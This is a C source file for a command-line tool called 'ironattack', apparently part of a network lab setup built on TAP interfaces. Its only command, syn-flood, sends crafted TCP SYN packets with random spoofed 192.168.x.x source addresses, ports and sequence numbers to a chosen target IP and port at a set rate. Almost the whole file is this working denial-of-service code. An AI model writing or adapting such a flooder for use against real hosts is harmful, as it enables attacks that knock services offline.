#include "craft.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>

static void usage(void) {
    fprintf(stderr, "Usage: ironattack <command> [options]\n\n");
    fprintf(stderr, "Commands:\n");
    fprintf(stderr, "  syn-flood  --target <ip> --port <port> [--rate <pps>] [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "\nAll commands require sudo (TAP access).\n");
}

static uint32_t parse_ip(const char *s) {
    struct in_addr addr;
    if (inet_pton(AF_INET, s, &addr) != 1) return 0;
    return addr.s_addr; /* already network byte order */
}

static uint32_t g_rand_state = 0;
static uint32_t fast_rand(void) {
    g_rand_state = g_rand_state * 1103515245 + 12345;
    return g_rand_state;
}

static int cmd_syn_flood(int argc, char **argv) {
    const char *target_str = NULL;
    const char *iface = "iron0";
    uint16_t port = 7;
    int rate = 1000;
    int count = 5000;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--rate") == 0 && i + 1 < argc) rate = atoi(argv[++i]);
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str) {
        fprintf(stderr, "Error: --target required\n");
        return 1;
    }

    uint32_t dst_ip = parse_ip(target_str);
    if (dst_ip == 0) {
        fprintf(stderr, "Error: invalid target IP '%s'\n", target_str);
        return 1;
    }

    int fd = tap_open(iface);
    if (fd < 0) {
        fprintf(stderr, "Error: cannot open TAP '%s' (run with sudo)\n", iface);
        return 1;
    }

    printf("=== SYN Flood Attack ===\n");
    printf("  Target:  %s:%d\n", target_str, port);
    printf("  Iface:   %s\n", iface);
    printf("  Rate:    %d pps\n", rate);
    printf("  Count:   %d\n", count);
    printf("\n");

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x01};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01}; /* router MAC */
    uint8_t frame[128];

    g_rand_state = (uint32_t)time(NULL);
    int usleep_interval = (rate > 0) ? (1000000 / rate) : 0;
    int sent = 0;

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 0; i < count; i++) {
        /* Random source IP: 192.168.X.Y */
        uint32_t src_ip = htonl(0xC0A80000 | (fast_rand() & 0xFFFF));
        uint16_t src_port = 10000 + (fast_rand() % 55000);
        uint32_t seq = fast_rand();

        int len = craft_tcp_syn(frame, sizeof(frame),
                                src_mac, dst_mac,
                                src_ip, dst_ip,
                                src_port, port, seq);
        if (len > 0) {
            tap_write(fd, frame, len);
            sent++;
        }

        if (usleep_interval > 0) usleep(usleep_interval);
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;

    printf("  Sent:    %d packets\n", sent);
    printf("  Elapsed: %.2f s\n", elapsed);
    printf("  Rate:    %.0f pps\n", sent / (elapsed > 0 ? elapsed : 1));
    printf("\n");

    close(fd);
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        usage();
        return 1;
    }

    const char *cmd = argv[1];

    if (strcmp(cmd, "syn-flood") == 0) {
        return cmd_syn_flood(argc - 2, argv + 2);
    } else if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
        usage();
        return 0;
    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        usage();
        return 1;
    }
}
